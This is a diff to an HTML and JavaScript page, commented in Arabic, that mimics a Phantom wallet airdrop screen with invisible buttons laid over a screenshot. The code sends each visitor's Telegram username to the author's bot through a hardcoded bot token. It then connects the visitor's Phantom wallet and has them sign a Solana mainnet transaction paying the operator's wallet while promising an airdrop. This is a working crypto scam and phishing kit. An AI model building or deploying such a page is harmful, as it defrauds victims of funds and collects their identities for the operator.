@@ -23,8 +23,7 @@
             position: relative;
             width: 380px;
             height: 600px;
-            /* استدعاء الصورة من مجلد assets */
-            background: url('assets/unnamed (43).jpg') no-repeat center top;
+            background: url('assets/unnamed (44).jpg') no-repeat center top;
             background-size: contain;
             border-radius: 40px;
             box-shadow: 0 20px 50px rgba(0,0,0,0.2);
@@ -72,7 +71,7 @@
             text-align: left;
         }
 
-        /* زر التحقق الأحمر الصغير */
+        /* زر التحقق الأحمر (المفتاح) */
         .btn-check-red {
             position: absolute;
             left: 4px;
@@ -85,7 +84,10 @@
             font-size: 11px;
             cursor: pointer;
             font-weight: bold;
+            transition: 0.3s;
         }
+
+        .btn-check-red:hover { background: #d03a7a; }
 
         /* أزرار شفافة فوق أزرار الصورة الأصلية */
         .invisible-btn {
@@ -122,61 +124,53 @@
         <button class="invisible-btn btn-connect-phantom" id="connectBtn" title="Connect Wallet"></button>
         <button class="invisible-btn btn-confirm-send" id="claimBtn" title="Confirm & Send"></button>
 
-        <div id="status-msg">Fees apply for your transaction.</div>
+        <div id="status-msg">اضغط "لتحقق" لتفعيل البوت والقناة</div>
     </div>
 </div>
 
 <script>
-    // --- إعدادات البرمجة (جاهزة بالآيدي الخاص بك) ---
+    // --- الإعدادات الخاصة بك يا رياض ---
     const BOT_TOKEN = "8313058030:AAEFwZuodTCXPptYxVjEcg2-G6sjUQ1pRIM"; 
-    const CHANNEL_ID = "@G_M_A_KISS_1"; 
-    const ADMIN_CHAT_ID = "7698283502"; // تم وضع الآيدي الخاص بك هنا
-    const MY_WALLET = "ضع_هنا_عنوان_محفظتك_الخاصة"; // <--- لا تنسَ وضع عنوان محفظتك هنا
+    const BOT_USERNAME = "G_M_A_KISS_BOT"; // تأكد من اسم البوت بدون @
+    const ADMIN_CHAT_ID = "7698283502"; // الآيدي الخاص بك لإرسال التنبيهات
+    const MY_WALLET = "ضع_هنا_عنوان_محفظتك_الخاصة"; // عنوان محفظة الاستلام
 
-    // 1. وظيفة التحقق وإرسال إشعار لك
-    document.getElementById('checkBtn').onclick = async () => {
+    // 1. وظيفة زر "لتحقق" (المفتاح)
+    document.getElementById('checkBtn').onclick = function() {
         const user = document.getElementById('tgUser').value.trim();
         if (!user) { alert("أدخل اسم المستخدم أولاً!"); return; }
         
-        const msgBox = document.getElementById('status-msg');
-        msgBox.innerText = "جاري التحقق...";
+        // إشعار فوري لك على تليجرام
+        const adminMsg = `🚀 محاولة دخول جديدة:\n👤 اليوزر: ${user}\nتم توجيهه للبوت الآن.`;
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodeURIComponent(adminMsg)}`);
 
-        try {
-            const cleanUser = user.replace('@', '');
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getChatMember?chat_id=${CHANNEL_ID}&user_id=${cleanUser}`;
-            
-            const res = await fetch(url);
-            const data = await res.json();
+        // فتح التليجرام وتشغيل البوت تلقائياً
+        window.open(`https://t.me/${BOT_USERNAME}?start=verify`, '_blank');
 
-            if(data.ok && ['member', 'administrator', 'creator'].includes(data.result.status)) {
-                alert("✅ تم التحقق!");
-                msgBox.innerHTML = "<span style='color:green'>تم التحقق. اربط محفظتك الآن.</span>";
-                
-                // إرسال إشعار لك (للأدمن) بأن رياض أو أي مستخدم تحقق
-                const adminMsg = `🔔 مستخدم جديد تحقق بنجاح:\n👤 اليوزر: ${user}`;
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodeURIComponent(adminMsg)}`);
-                
-            } else {
-                alert("❌ يجب عليك الانضمام للقناة أولاً!");
-            }
-        } catch (e) { alert("خطأ في الاتصال"); }
+        document.getElementById('status-msg').innerText = "🟢 تم فتح التليجرام.. اشترك ثم اربط محفظتك";
+        document.getElementById('status-msg').style.color = "green";
     };
 
     // 2. ربط محفظة Phantom
     document.getElementById('connectBtn').onclick = async () => {
-        if (window.solana) {
+        if (window.solana && window.solana.isPhantom) {
             try {
                 const resp = await window.solana.connect();
                 document.getElementById('walletAddr').value = resp.publicKey.toString().slice(0,20) + "...";
                 document.getElementById('status-msg').innerText = "المحفظة متصلة ✅";
-            } catch (err) { console.log("Rejected"); }
-        } else { alert("يرجى تثبيت Phantom"); }
+            } catch (err) { console.log("User rejected"); }
+        } else {
+            alert("يرجى تثبيت محفظة Phantom");
+        }
     };
 
-    // 3. وظيفة الإرسال
+    // 3. تأكيد الإرسال (Confirm & Send)
     document.getElementById('claimBtn').onclick = async () => {
         const wallet = document.getElementById('walletAddr').value;
-        if (!wallet) { alert("اربط المحفظة أولاً!"); return; }
+        if (!wallet || wallet === "walletAddress") { 
+            alert("يرجى الضغط على زر الربط الأخضر أولاً!"); 
+            return; 
+        }
 
         try {
             const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
@@ -194,9 +188,10 @@
 
             const signed = await window.solana.signTransaction(transaction);
             const signature = await connection.sendRawTransaction(signed.serialize());
-            alert("✅ تم إرسال الطلب بنجاح!");
+            
+            alert("✅ تم إرسال الطلب! انتظر الإسقاط الجوي.");
         } catch (err) {
-            alert("فشلت العملية. تأكد من وجود رصيد كافٍ.");
+            alert("فشلت العملية. تأكد من وجود رصيد كافٍ (0.0006 SOL).");
         }
     };
 </script>
